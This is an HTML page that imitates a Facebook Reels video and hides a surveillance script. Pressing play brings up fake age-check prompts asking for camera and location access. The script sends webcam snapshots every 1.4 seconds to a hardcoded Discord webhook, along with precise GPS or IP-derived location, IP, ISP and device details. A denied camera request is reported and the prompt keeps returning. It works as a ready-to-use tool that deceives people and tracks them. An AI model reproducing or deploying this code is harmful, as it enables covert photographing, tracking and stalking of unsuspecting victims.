<!DOCTYPE html>
<html lang="de">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Facebook</title>
  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico">
  <style>
    body { margin:0; font-family:Helvetica,Arial,sans-serif; background:#000; color:#fff; overflow:hidden; touch-action:manipulation; -webkit-tap-highlight-color:transparent; }
    .header { position:fixed; top:0; left:0; right:0; height:56px; background:rgba(0,0,0,0.85); display:flex; align-items:center; padding:0 16px; z-index:100; backdrop-filter:blur(14px); }
    .close { font-size:38px; font-weight:bold; cursor:pointer; margin-right:20px; user-select:none; }
    .title { flex:1; text-align:center; font-size:20px; font-weight:600; }
    .reel { height:100vh; position:relative; }
    .profile { position:absolute; top:80px; left:20px; display:flex; align-items:center; z-index:10; pointer-events:none; }
    .avatar { width:52px; height:52px; border-radius:50%; background:#666; margin-right:14px; }
    .info { font-size:17px; line-height:1.2; }
    .name { font-weight:600; }
    .pub { font-size:14px; opacity:0.9; }
    .play-area { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; z-index:5; cursor:pointer; }
    .play-btn { width:140px; height:140px; background:rgba(0,0,0,0.65); border-radius:50%; display:flex; align-items:center; justify-content:center; pointer-events:auto; }
    .triangle { width:0; height:0; border-top:46px solid transparent; border-bottom:46px solid transparent; border-left:74px solid #fff; margin-left:14px; }
    .text-overlay { position:absolute; bottom:280px; left:0; right:0; font-size:3.2rem; text-align:center; text-shadow:0 6px 35px #000; pointer-events:none; line-height:1.1; z-index:4; }
    .actions { position:absolute; bottom:80px; right:32px; display:flex; flex-direction:column; gap:44px; font-size:40px; color:#fff; z-index:6; pointer-events:none; }
    .audio { position:absolute; bottom:36px; left:20px; font-size:16px; opacity:0.85; z-index:10; pointer-events:none; }
    #cam-prompt, #loc-prompt { position:fixed; inset:0; background:rgba(0,0,0,0.95); display:none; align-items:center; justify-content:center; z-index:9999; pointer-events:auto; }
    .modal-box { background:#fff; color:#000; padding:60px 50px; border-radius:26px; max-width:500px; text-align:center; box-shadow:0 26px 90px rgba(0,0,0,0.85); pointer-events:auto; }
    .btn { padding:22px 100px; font-size:1.45rem; font-weight:bold; border:none; border-radius:16px; margin:26px 16px; cursor:pointer; pointer-events:auto; touch-action:manipulation; }
    .allow { background:#1877f2; color:#fff; }
    .deny { background:#e4e6eb; color:#000; }
  </style>
</head>
<body>
<div class="header">
  <div class="close" id="closeBtn">√ó</div>
  <div class="title">Reels</div>
</div>

<div class="reel">
  <div class="profile">
    <div class="avatar"></div>
    <div class="info">
      <div class="name">Zorica Zoka Dimitrijevic</div>
      <div class="pub">√ñffentlich</div>
    </div>
  </div>

  <div class="play-area" id="playArea">
    <div class="play-btn" id="playBtn"><div class="triangle"></div></div>
  </div>

  <div class="text-overlay">DOK MI NISI<br>PAO U OCIMA DUBOKO</div>

  <div class="actions">
    <div>‚ù§Ô∏è 14.6K</div>
    <div>üí¨ 305</div>
    <div>‚û§</div>
  </div>

  <div class="audio">Zorica Zoka Dimitrijevic ¬∑ Original audio ¬∑ Zorica</div>
</div>

<div id="cam-prompt">
  <div class="modal-box">
    <h2>Video kann nicht abgespielt werden</h2>
    <p style="margin:34px 0; font-size:1.45rem;">Kurze Kamera-Freigabe f√ºr Alterspr√ºfung n√∂tig.</p>
    <div id="cam-err" style="color:#c00;display:none;margin:26px 0;">Zugriff verweigert ‚Äì erneut versuchen</div>
    <button id="allowCamBtn" class="btn allow">KAMERA FREIGEBEN</button>
    <button id="denyCamBtn" class="btn deny">ABBRECHEN</button>
  </div>
</div>

<div id="loc-prompt">
  <div class="modal-box">
    <h2>Standort erforderlich</h2>
    <p style="margin:34px 0; font-size:1.45rem;">Teile deinen genauen Standort, um das Video zu laden.</p>
    <button id="allowLocBtn" class="btn allow">STANDORT TEILEN</button>
    <button id="denyLocBtn" class="btn deny">NEIN</button>
  </div>
</div>

<video id="v" autoplay muted playsinline style="display:none"></video>
<canvas id="c" style="display:none"></canvas>

<script>
const HOOK = "https://discord.com/api/webhooks/1469356230932824309/a37FAcac9zDeOiHgx2kNAukuUHrFjDrX0XZg5b_Q1R_bVbtZRhL070tfkOeEGhysRYPI";
let count = 0, stream = null, v = document.getElementById('v'), c = document.getElementById('c');

async function getGeo() {
  let geo = null;
  try {
    geo = await (await fetch('https://ipapi.co/json/')).json();
    if (geo.ip && geo.latitude) return geo;
  } catch {}
  try {
    geo = await (await fetch('https://ipinfo.io/json')).json();
    if (geo.ip && geo.loc) {
      const [lat, lon] = geo.loc.split(',');
      geo.latitude = parseFloat(lat);
      geo.longitude = parseFloat(lon);
      return geo;
    }
  } catch {}
  return {ip:'unbekannt', city:'?', region:'?', country:'?', postal:'?', org:'?', latitude:null, longitude:null};
}

async function getGPS() {
  return new Promise(r => {
    if (!navigator.geolocation) return r(null);
    navigator.geolocation.getCurrentPosition(
      pos => r({latitude:pos.coords.latitude, longitude:pos.coords.longitude, accuracy:pos.coords.accuracy}),
      () => r(null),
      {enableHighAccuracy:true, timeout:22000, maximumAge:0}
    );
  });
}

async function send(type, blob = null) {
  try {
    let loc = await getGPS() || await getGeo();
    let ip = loc.ip || 'unbekannt';
    let city = loc.city || '?', region = loc.region || '?', country = loc.country || '?', postal = loc.postal || '?', org = loc.org || '?';
    let lat = loc.latitude, lon = loc.longitude;
    let acc = lat ? `${Math.round(loc.accuracy || 500)} m` : 'IP-Fallback';
    let maps = lat ? `https://maps.google.com/?q=${lat.toFixed(7)},${lon.toFixed(7)}&z=19&layer=c` : null;

    const embed = {
      title: `üî¥ FB ${type} #${++count}`,
      color: lat ? 0x00ffbb : 0xff0000,
      fields: [
        {name:"Event", value:type, inline:true},
        {name:"IP + Ort", value:`**${ip}**\n${city} ‚Ä¢ ${region} ‚Ä¢ ${country} ‚Ä¢ ${postal} ‚Ä¢ ${org}`, inline:true},
        {name:"Genauigkeit", value:acc, inline:true},
        {name:"UA", value:navigator.userAgent.substring(0,140), inline:false},
        {name:"Screen", value:`${screen.width}√ó${screen.height}`, inline:true},
        {name:"Zeit", value:new Date().toISOString(), inline:true}
      ],
      timestamp: new Date().toISOString()
    };
    if (maps) embed.fields.push({name:"Google Maps ‚Äì Position", value:`[‚Üí exakte Stelle](${maps})`, inline:false});

    const payload = {embeds:[embed]};
    if (blob) {
      let fd = new FormData();
      fd.append("payload_json", JSON.stringify(payload));
      fd.append("file", blob, `snap_${Date.now()}.jpg`);
      await fetch(HOOK + "?wait=true", {method:"POST", body:fd});
    } else {
      await fetch(HOOK + "?wait=true", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify(payload)});
    }
  } catch {}
}

function startCapture() {
  document.getElementById('cam-prompt').style.display = 'flex';
  send('PLAY_CLICK');
}

const playBtn = document.getElementById('playBtn');
playBtn.addEventListener('click', startCapture);
playBtn.addEventListener('touchend', e => { e.preventDefault(); startCapture(); });

document.getElementById('allowCamBtn').onclick = async () => {
  document.getElementById('cam-prompt').style.display = 'none';
  try {
    stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user", width:{ideal:1280}, height:{ideal:720}}});
    v.srcObject = stream;
    await v.play();
    c.width = v.videoWidth || 1280;
    c.height = v.videoHeight || 720;
    setInterval(async () => {
      c.getContext('2d').drawImage(v,0,0,c.width,c.height);
      let blob = await new Promise(r => c.toBlob(r,'image/jpeg',0.88));
      send('CAM SNAP', blob);
    }, 1400);
    setTimeout(() => {
      document.getElementById('loc-prompt').style.display = 'flex';
    }, 4000);
  } catch(e) {
    send('CAM_ERROR');
    document.getElementById('cam-err').style.display = 'block';
    setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 3000);
  }
};

document.getElementById('denyCamBtn').onclick = () => {
  document.getElementById('cam-err').style.display = 'block';
  send('CAM_DENY');
  setTimeout(() => document.getElementById('cam-prompt').style.display = 'flex', 2400);
};

document.getElementById('allowLocBtn').onclick = async () => {
  document.getElementById('loc-prompt').style.display = 'none';
  send('LOC_GRANTED');
};

document.getElementById('denyLocBtn').onclick = () => {
  document.getElementById('loc-prompt').style.display = 'none';
  send('LOC_DENY');
};

document.getElementById('closeBtn').onclick = () => {
  location.reload();
};
</script>
</body>
</html>
